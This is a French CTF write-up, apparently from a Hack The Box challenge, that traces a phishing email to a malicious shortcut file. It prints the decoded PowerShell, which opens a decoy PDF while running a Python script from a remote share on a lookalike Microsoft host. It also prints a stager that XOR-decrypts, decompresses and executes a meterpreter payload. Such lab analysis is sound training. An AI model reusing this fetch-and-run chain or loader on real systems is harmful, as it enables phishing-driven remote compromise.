# A new Hire
### The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

Tout d'abord, le challenge nous acceuille avec un fichier .eml, donc un mail. On l'ouvre alors pour voir son contenu :

![mail](https://github.com/user-attachments/assets/5a98887e-2016-47fd-9278-ea2060108038)

On se rend alors sur le lien donné par le challenge après une petite modification de `/etc/hosts` au passage et en mettant le port fournis par le challenge.  
On arrive alors sur un index.php, qui nous demande de cliquer sur un bouton pour révéler le fameux CV : 

![index php](https://github.com/user-attachments/assets/2e5a353f-aa1d-4f3f-84c3-cc4508fa220d)

Ce bouton, censé nous débloquer l'accès au CV, télécharge enfaîte ceci : 

![remuse pdf](https://github.com/user-attachments/assets/36f27514-808b-4cf9-89c7-dedbb8d668e6)

Je me demande donc, qu'est ce que ce raccourci peut bien faire de beau ?

![raccourci](https://github.com/user-attachments/assets/42e35513-8fde-402a-b699-ae8e0fd6fdbe)

Une fois décodé du base64, on obtient ceci :
```powershell 
[System.Diagnostics.Process]::Start('msedge', 'http://storage.microsoftcloudservices.com:41075/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf');  \\storage.microsoftcloudservices.com@41075\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@41075\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
```
On se rends donc sur l'url `http://storage.microsoftcloudservices.com:41075/3fe1690d955e8fd2a0b282501570e1f4/configs/client.py`, ce qui nous fait download un autre petit cadeau : 
```python
key=base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")

data = base64.b64decode("c97FeXRj6jeG5P74ANItMBN […] ")
meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

exec(__import__('zlib').decompress(meterpreter_data)[0])
```
Ce qui nous mène, à ceci : 
```python
import base64
print(base64.b64decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg=="))
```
Bingo  ! On rends ça lisible une nouvelle fois : 

![flag2](https://github.com/user-attachments/assets/9fe23c1a-e189-40e2-841f-21a5ef59b4b5)

Et voilà !
